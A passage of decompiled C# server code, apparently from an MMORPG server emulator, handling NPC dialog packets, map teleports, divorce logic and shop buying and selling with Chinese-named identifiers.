					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					break;
				case 136:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 137:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					if (是否已婚 == 0 && 解除关系倒计时 > 0)
					{
						array2[0] = 2;
						if (合成物品表 != null)
						{
							合成物品表.Clear();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成系统解锁();
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						解除男女关系();
					}
					break;
				case 139:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 140:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 142:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					if (是否已婚 == 1 && 解除关系倒计时 >= 0)
					{
						array2[0] = 2;
						if (合成物品表 != null)
						{
							合成物品表.Clear();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成系统解锁();
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						解除男女关系();
					}
					else if (是否已婚 == 0 && 解除关系倒计时 >= 0)
					{
						array2[0] = 2;
						if (合成物品表 != null)
						{
							合成物品表.Clear();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成系统解锁();
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						解除男女关系();
					}
					break;
				case 145:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 146:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 147:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					if (是否已婚 == 1 && 解除关系倒计时 > 0)
					{
						array2[0] = 2;
						if (合成物品表 != null)
						{
							合成物品表.Clear();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成系统解锁();
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						解除男女关系();
					}
					break;
				case 148:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 149:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 150:
					if (base.Player_Level < int.Parse(World.地图限制等级[2]))
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						系统提示("只有" + int.Parse(World.地图限制等级[2]) + "等级以后才可以进入。");
					}
					else
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(1884f, -1635f, 15f, 25100);
					}
					break;
				case 153:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-360f, -363f, 15f, 25201);
					break;
				case 154:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(117f, -267f, 15f, 25202);
					break;
				case 156:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(117f, -267f, 15f, 25301);
					break;
				case 157:
				{
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					int num = RNG.Next(2, 10);
					switch (num)
					{
					case 2:
						移动(117f, -267f, 15f, 25200 + num);
						break;
					case 3:
						移动(125f, -329f, 15f, 25200 + num);
						break;
					case 4:
						移动(124f, -244f, 15f, 25200 + num);
						break;
					case 5:
						移动(138f, -271f, 15f, 25200 + num);
						break;
					case 6:
						移动(158f, 256f, 15f, 25200 + num);
						break;
					case 7:
						移动(300f, 92f, 15f, 25200 + num);
						break;
					case 8:
						移动(158f, -302f, 15f, 25200 + num);
						break;
					case 9:
						移动(32f, 92f, 15f, 25200 + num);
						break;
					case 10:
						移动(154f, 30f, 15f, 25200 + num);
						break;
					}
					break;
				}
				case 158:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-360f, -363f, 15f, 25201);
					break;
				case 199:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					膜拜系统();
					break;
				case 191:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 213:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 209:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 243:
					if (base.Player_Level < int.Parse(World.地图限制等级[4]))
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(array2, 0, array3, 14, 2);
						系统提示("只有" + int.Parse(World.地图限制等级[4]) + "等级以后才可以进入。");
					}
					else
					{
						Buffer.BlockCopy(array, 0, array3, 18, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(-1992f, 1206f, 15f, 26100);
					}
					break;
				case 241:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					打开灵宠仓库();
					break;
				case 28:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					打开灵兽仓库();
					break;
				case 238:
					打开仓库中 = true;
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				default:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(array2, 0, array3, 10, 2);
					Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 304:
					Buffer.BlockCopy(array, 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(570f, 1073f, 15f, 101);
					}
					break;
				case 300:
					if (查找范围Npc(186, 30))
					{
						打开仓库中 = true;
						Buffer.BlockCopy(array2, 0, array3, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(245), 0, array3, 14, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 15, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 16, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 17, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 18, 2);
						合成物品表.Clear();
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(242), 0, array3, 14, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 15, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 16, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 17, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 18, 2);
					}
					break;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
			}
			catch
			{
			}
		}

		public void 参加武林血战()
		{
			if (World.MartialBloodBattleProgress < 1)
			{
				系统提示("血战未开启, 请于血战开启准备后10分钟内申请", 9, "血战提示");
				return;
			}
			if (World.MartialBloodBattleProgress > 1)
			{
				系统提示("血战已经开启, 无法进入, 请于血战开启准备后10分钟内申请", 9, "血战提示");
				return;
			}
			if (base.人物_战斗增加_HP == 0)
			{
				base.人物_战斗增加_HP = base.人物最大_HP * 10;
			}
			base.人物_HP = base.人物最大_HP;
			if (base.人物_战斗增加_MP == 0)
			{
				base.人物_战斗增加_MP = base.人物最大_MP * 10;
			}
			base.人物_MP = base.人物最大_MP;
			更新HP_MP_SP();
			移动(0f, 0f, 15f, 8001);
		}

		public void 解除男女关系()
		{
			try
			{
				解除关系倒计时 = 0;
				Players players = World.检查玩家name(base.FLD_情侣);
				if (players != null)
				{
					base.FLD_情侣 = "";
					base.FLD_情侣_爱情度 = 0;
					武功新[2, 16] = null;
					武功新[2, 17] = null;
					players.FLD_情侣 = "";
					players.FLD_情侣_爱情度 = 0;
					players.武功新[2, 16] = null;
					players.武功新[2, 17] = null;
					players.解除关系倒计时 = 0;
					players.情侣提示(15, base.FLD_情侣, base.UserName);
					情侣提示(15, base.UserName, base.FLD_情侣);
					players.更新情侣系统(2, base.UserName, string.Empty, players.解除关系倒计时, DateTime.Now);
					更新情侣系统(2, base.FLD_情侣, string.Empty, 解除关系倒计时, DateTime.Now);
					RxjhClass.变更婚姻状态(base.FLD_情侣, 0);
				}
				else
				{
					系统提示("对方不在线离婚错误。");
				}
			}
			catch
			{
			}
		}

		public void 双倍扣武勋()
		{
			CheckTreasureGems();
			if (World.开启双倍扣武勋 != null)
			{
				系统提示("有人已经开启" + World.双倍扣武勋倍数 + "倍扣武勋！无需重复开启。", 10, "系统提示");
			}
			else if (base.FLD_RXPIONT >= World.双倍扣武勋元宝数量)
			{
				检察元宝数据(World.双倍扣武勋元宝数量, 0, "双倍武勋");
				SaveGemData();
				if (World.开启双倍扣武勋 != null)
				{
					return;
				}
				World.开启双倍扣武勋 = new 双倍扣武勋();
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					value.系统提示("不怕死的[" + value.UserName + "] 花" + World.双倍扣武勋元宝数量 + "元宝, 在泫勃派南门启了" + World.双倍扣武勋倍数 + "倍扣武勋系统, 一起锁他吧...", 10, "系统提示");
				}
			}
			else
			{
				系统提示("元宝不足" + World.双倍扣武勋元宝数量 + "无法使用此功能！", 10, "系统提示");
			}
		}

		public void 打开商店(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (base.人物_HP > 0 && !base.Player死亡 && !退出中)
				{
					封包修改(封包数据, 封包大小);
					byte[] array = new byte[2];
					byte[] array2 = new byte[2];
					byte[] array3 = new byte[2];
					Buffer.BlockCopy(封包数据, 10, array2, 0, 2);
					Buffer.BlockCopy(封包数据, 18, array, 0, 2);
					Buffer.BlockCopy(封包数据, 30, array3, 0, 2);
					base.操作ID = BitConverter.ToInt16(array, 0);
					base.操作类型 = BitConverter.ToInt16(array2, 0);
					base.操作页码 = BitConverter.ToInt16(array3, 0);
					if (安全码是否通过验证)
					{
						打开商店(base.操作ID, base.操作类型, base.操作页码);
					}
					else
					{
						发送安全码消息(9);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "打开商店 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 买卖东西(byte[] 封包数据, int 封包大小)
		{
			int num = 0;
			try
			{
				if (退出中)
				{
					return;
				}
				封包修改(封包数据, 封包大小);
				int num7 = 封包数据[10];
				int num8 = 封包数据[68];
				int num9 = BitConverter.ToInt32(封包数据, 18);
				int num10 = BitConverter.ToInt32(封包数据, 26);
				if (num10 <= 0 || num10 > 9999)
				{
					return;
				}
				num = 1;
				if (退出中)
				{
					return;
				}
				byte[] array = new byte[56];
				ShopClass shopClass;
				long num11;
				物品类 物品类2;
				if (World.Itme.TryGetValue(num9, out var value))
				{
					if (value.FLD_QUESTITEM == 1)
					{
						return;
					}
					if (num7 == 1)
					{
						if (num10 < 1)
						{
							return;
						}
						shopClass = ShopClass.Getwp(num9);
						if (shopClass == null)
						{
							return;
						}
						num11 = shopClass.Price * num10;
						if (num11 < 0)
						{
							return;
						}
						物品类2 = 得到包裹物品(1000001504);
						if (shopClass.RequiredIceJade == 0)
						{
							goto IL_072b;
						}
						if (物品类2 == null)
						{
							系统提示("您背包没有冰魄水玉无法购买", 50, "");
							return;
						}
						if (BitConverter.ToInt32(装备栏包裹[物品类2.物品位置].物品数量, 0) >= shopClass.RequiredIceJade * num10)
						{
							goto IL_072b;
						}
						系统提示("您的冰魄水玉不足" + shopClass.RequiredIceJade * num10 + ", 无法购买此物品", 50, "");
					}
					else
					{
						if (num10 < 1)
						{
							return;
						}
						num = 7;
						物品类 物品类3 = 装备栏包裹[num8];
						if (装备栏包裹[num8].物品绑定 || BitConverter.ToInt32(物品类3.物品ID, 0) == 0 || BitConverter.ToInt32(物品类3.物品数量, 0) == 0)
						{
							return;
						}
						if (BitConverter.ToInt32(物品类3.物品ID, 0) != num9)
						{
							MainForm.WriteLine(6, "买卖东西BUG22 [" + num9 + "][" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] ");
							return;
						}
						num = 8;
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品类3.物品ID, 0), out var value5))
						{
							return;
						}
						if (value5.FLD_LOCK != 1)
						{
							long num12;
							switch (num9)
							{
							default:
								if (value.FLD_TYPE == 6 || num10 < 1 || BitConverter.ToInt32(物品类3.物品ID, 0) != num9 || 物品类3.Get物品数量 < num10)
								{
									return;
								}
								num12 = value.FLD_RECYCLE_MONEY * num10;
								if (base.FLD_人物_追加_贩卖价格百分比 <= 0.0)
								{
									base.FLD_人物_追加_贩卖价格百分比 = 0.0;
								}
								else
								{
									num12 = (long)((double)num12 * (1.0 + base.FLD_人物_追加_贩卖价格百分比));
								}
								if (num12 < 0 || num12 > 2000000000)
								{
									return;
								}
								if (base.Player_Money + num12 > World.最大钱数)
								{
									系统提示("个人随身携带金额上限为[" + World.最大钱数 / 100000000 + "亿]两。");
									return;
								}
								base.Player_Money += num12;
								break;
							case 700000002:
								if (BitConverter.ToInt32(物品类3.物品ID, 0) != 700000002 || 物品类3.Get物品数量 < num10)
								{
									return;
								}
								num12 = 100000000L;
								if (base.Player_Money + 100000000 > World.最大钱数)
								{
									系统提示("个人随身携带金额上限为[" + World.最大钱数 / 100000000 + "亿]两。");
									return;
								}
								base.Player_Money += num12;
								break;
							case 700000003:
								if (BitConverter.ToInt32(物品类3.物品ID, 0) != 700000003 || 物品类3.Get物品数量 < num10)
								{
									return;
								}
								num12 = 5000000000L;
								if (base.Player_Money + 5000000000L > World.最大钱数)
								{
									系统提示("个人随身携带金额上限为[" + World.最大钱数 / 100000000 + "亿]两。");
									return;
								}
								base.Player_Money += num12;
								break;
							case 700000004:
								if (BitConverter.ToInt32(物品类3.物品ID, 0) != 700000004 || 物品类3.Get物品数量 < num10)
								{
									return;
								}
								num12 = 10000000000L;
								if (base.Player_Money + 10000000000L > World.最大钱数)
								{
									系统提示("个人随身携带金额上限为[" + World.最大钱数 / 100000000 + "亿]两。");
									return;
								}
								base.Player_Money += num12;
								break;
							}
							num = 9;
							switch (value.FLD_RESIDE2)
							{
							case 1:
							case 2:
							case 4:
							case 5:
							case 6:
							case 7:
							case 8:
							case 10:
							case 14:
							case 15:
								RxjhClass.商店记录(base.Userid, base.UserName, num9, value.ItmeNAME, "出售", num10, num12, 装备栏包裹[num8].FLD_MAGIC0, 装备栏包裹[num8].FLD_MAGIC1, 装备栏包裹[num8].FLD_MAGIC2, 装备栏包裹[num8].FLD_MAGIC3, 装备栏包裹[num8].FLD_MAGIC4);
								break;
							}
							byte[] bytes = BitConverter.GetBytes(num12);
							买卖物品(num8, num7, bytes, BitConverter.GetBytes(num10), null, BitConverter.GetBytes(num9), array);
							num = 10;
							goto IL_071e;
						}
						系统提示("[百宝阁]锁定的物品禁止出售。");
					}
					return;
				}
				MainForm.WriteLine(1, "买卖东西 出错 没有这个物品 [" + base.Userid + "][" + base.UserName + "] [" + num9 + "] [" + num10 + "] ");
				goto end_IL_0003;
				IL_071e:
				更新金钱和负重();
				goto end_IL_0003;
				IL_072b:
				if (shopClass.RequiredWarMerit != 0 && base.Player_Whtb < shopClass.RequiredWarMerit)
				{
					系统提示("您的武皇币不足" + shopClass.RequiredWarMerit + ", 无法购买此物品", 50, "");
					return;
				}
				if (base.Player_Money < num11)
				{
					购买物品提示(13);
					系统提示("金钱不足, 本次购买物品总额为:" + (double)num11 / 10000.0 + "万。");
					return;
				}
				if (value.FLD_WEIGHT * num10 + base.人物当前负重 >= base.总负重)
				{
					购买物品提示(11);
					return;
				}
				num = 2;
				bool flag = false;
				int num13 = 得到包裹空位(this);
				if (num13 == -1)
				{
					购买物品提示(14);
					return;
				}
				num = 3;
				int num14 = shopClass.MagicProperty0;
				int fLD_MAGIC = shopClass.MagicProperty1;
				if (num14 == 0)
				{
					switch (num9)
					{
					case 800000011:
						num9 = 800000001;
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int num5 = 0; num5 < num10 - 1; num5++)
							{
								int 位置2 = 得到包裹空位(this);
								int value4 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置2, 1, value4, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(800000011, 1);
						break;
					case 800000012:
						num9 = 800000002;
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int m = 0; m < num10 - 1; m++)
							{
								int 位置6 = 得到包裹空位(this);
								int value10 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置6, 1, value10, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(800000002, 1);
						break;
					case 800000013:
						num14 = World.GetValue(800000013, 1);
						break;
					case 800000002:
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int k = 0; k < num10 - 1; k++)
							{
								int 位置4 = 得到包裹空位(this);
								int value8 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置4, 1, value8, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(800000002, 1);
						break;
					case 800000001:
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int n = 0; n < num10 - 1; n++)
							{
								int 位置7 = 得到包裹空位(this);
								int value11 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置7, 1, value11, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(800000001, 1);
						break;
					case 800000061:
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int num3 = 0; num3 < num10 - 1; num3++)
							{
								int 位置9 = 得到包裹空位(this);
								int value2 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置9, 1, value2, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(num9, 1);
						break;
					case 800000023:
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int num4 = 0; num4 < num10 - 1; num4++)
							{
								int 位置10 = 得到包裹空位(this);
								int value3 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置10, 1, value3, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(800000023, 1);
						break;
					case 800000024:
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int l = 0; l < num10 - 1; l++)
							{
								int 位置5 = 得到包裹空位(this);
								int value9 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置5, 1, value9, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(800000024, 1);
						break;
					case 800000025:
						num9 = 800000001;
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int num2 = 0; num2 < num10 - 1; num2++)
							{
								int 位置8 = 得到包裹空位(this);
								int value12 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置8, 1, value12, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(800000025, 1);
						break;
					case 800000026:
						num9 = 800000001;
						if (num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int j = 0; j < num10 - 1; j++)
							{
								int 位置3 = 得到包裹空位(this);
								int value7 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置3, 1, value7, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(800000026, 1);
						break;
					case 800000027:
						num9 = 800000028;
						num14 = World.GetValue(800000028, 1);
						break;
					case 800000034:
						num9 = 800000030;
						shopClass.MagicProperty0 = World.GetValue(800000034, 1);
						break;
					case 800000035:
						num9 = 800000031;
						shopClass.MagicProperty0 = World.GetValue(800000035, 1);
						break;
					case 800000036:
						num14 = RNG.Next(200005, 200015);
						break;
					case 800000037:
						num14 = RNG.Next(200010, 200030);
						break;
					case 1000000321:
						shopClass.MagicProperty0 = RNG.Next(0, 1000);
						shopClass.MagicProperty1 = RNG.Next(10, 20);
						break;
					case 1000000323:
						shopClass.MagicProperty0 = RNG.Next(0, 1000);
						shopClass.MagicProperty1 = RNG.Next(100, 150);
						break;
					case 1000000325:
						shopClass.MagicProperty0 = RNG.Next(0, 1000);
						shopClass.MagicProperty1 = RNG.Next(400, 699);
						break;
					case 1000000327:
						shopClass.MagicProperty0 = RNG.Next(0, 1000);
						shopClass.MagicProperty1 = RNG.Next(2000, 2499);
						break;
					case 800000062:
						if ((num9 == 800000001 || num9 == 800000002 || num9 == 800000011 || num9 == 800000012 || num9 == 800000023 || num9 == 800000024 || num9 == 800000025 || num9 == 800000026 || num9 == 800000061 || num9 == 800000062) && num10 > 1)
						{
							if (num10 > 得到包裹空位数())
							{
								购买物品提示(14);
								return;
							}
							flag = true;
							for (int i = 0; i < num10 - 1; i++)
							{
								int 位置 = 得到包裹空位(this);
								int value6 = World.GetValue(num9, 1);
								AddItemWithProperties(num9, 位置, 1, value6, 0, 0, 0, 0, 0, 0, 0, 0, 0);
							}
						}
						num14 = World.GetValue(num9, 1);
						break;
					}
				}
				num = 4;
				byte[] bytes2 = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
				Buffer.BlockCopy(BitConverter.GetBytes(num14), 0, array, 0, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(fLD_MAGIC), 0, array, 4, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(shopClass.MagicProperty2), 0, array, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(shopClass.MagicProperty3), 0, array, 12, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(shopClass.MagicProperty4), 0, array, 16, 4);
				num = 5;
				long num6;
				switch (num9)
				{
				default:
					num6 = ((shopClass.Price != 0L) ? (shopClass.Price * num10) : ((long)value.FLD_SALE_MONEY * (long)num10));
					if (base.人物善恶 <= -1 && base.人物善恶 > -500)
					{
						num6 += (int)((double)num6 * 0.3);
					}
					else if (base.人物善恶 <= -500 && base.人物善恶 > -5000)
					{
						num6 += (int)((double)num6 * 0.5);
					}
					else if (base.人物善恶 <= -5000 && base.人物善恶 > -10000)
					{
						num6 *= 2;
					}
					else if (base.人物善恶 <= -10000 && base.人物善恶 > -30000)
					{
						num6 *= 4;
					}
					else if (base.人物善恶 <= -30000)
					{
						num6 *= 4;
					}
					if (num6 < 0 || num6 > 2000000000)
					{
						return;
					}
					if (shopClass.RequiredWarMerit != 0)
					{
						base.Player_Whtb -= shopClass.RequiredWarMerit;
						更新武功和状态();
						系统提示(shopClass.RequiredWarMerit + " 武皇币减少");
					}
					if (shopClass.RequiredIceJade != 0)
					{
						减去物品(物品类2.物品位置, shopClass.RequiredIceJade * num10);
						系统提示(shopClass.RequiredIceJade * num10 + " 冰魄水玉减少");
						更新武功和状态();
						保存人物数据存储过程();
					}
					if (base.Player_Money < num6)
					{
						购买物品提示(13);
						系统提示("金钱不足, 本次购买总价为:" + (double)num6 / 10000.0 + "万。");
						return;
					}
					base.Player_Money -= num6;
					break;
				case 700000002:
					if (base.Player_Money < 100200000)
					{
						购买物品提示(13);
						return;
					}
					num6 = 100200000L;
					base.Player_Money -= 100200000L;
					base.人物当前负重 += value.FLD_WEIGHT * num10;
					break;
				case 700000003:
					if (base.Player_Money < 5010000000L)
					{
						购买物品提示(13);
						return;
					}
					num6 = 5050000000L;
					base.Player_Money -= 5050000000L;
					base.人物当前负重 += value.FLD_WEIGHT * num10;
					break;
				case 700000004:
					if (base.Player_Money < 10020000000L)
					{
						购买物品提示(13);
						return;
					}
					num6 = 10100000000L;
					base.Player_Money -= 10100000000L;
					base.人物当前负重 += value.FLD_WEIGHT * num10;
					break;
				}
				byte[] bytes3 = BitConverter.GetBytes(num6);
				if (flag)
				{
					num10 = 1;
					num13 = 得到包裹空位(this);
				}
				买卖物品(num13, num7, bytes3, BitConverter.GetBytes(num10), bytes2, BitConverter.GetBytes(num9), array);
				RxjhClass.商店记录(base.Userid, base.UserName, num9, value.ItmeNAME, "购买", num10, num6, num14, fLD_MAGIC, shopClass.MagicProperty2, shopClass.MagicProperty3, shopClass.MagicProperty4);
				num = 6;
				goto IL_071e;
				end_IL_0003:;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "买卖东西 出错 [" + base.Userid + "][" + base.UserName + "] [" + BitConverter.ToInt32(封包数据, 18) + "] [" + num + "] " + ex.Message);
			}
		}

		public void 武勋消耗提示(int 数量)
		{
			byte[] array = Converter.hexStringToByte("AA5516008A02D218080013000000F0D8FFFF000000000000DA1F55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 买卖物品(int 位置, int 买卖, byte[] 价格, byte[] 物品数量, byte[] 物品全局ID, byte[] 物品ID, byte[] 物品属性)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA558E00470393008000020000000200000065CA9A3B0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000010E020F000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000094B555AA");
				Buffer.BlockCopy(BitConverter.GetBytes(买卖), 0, array, 10, 1);
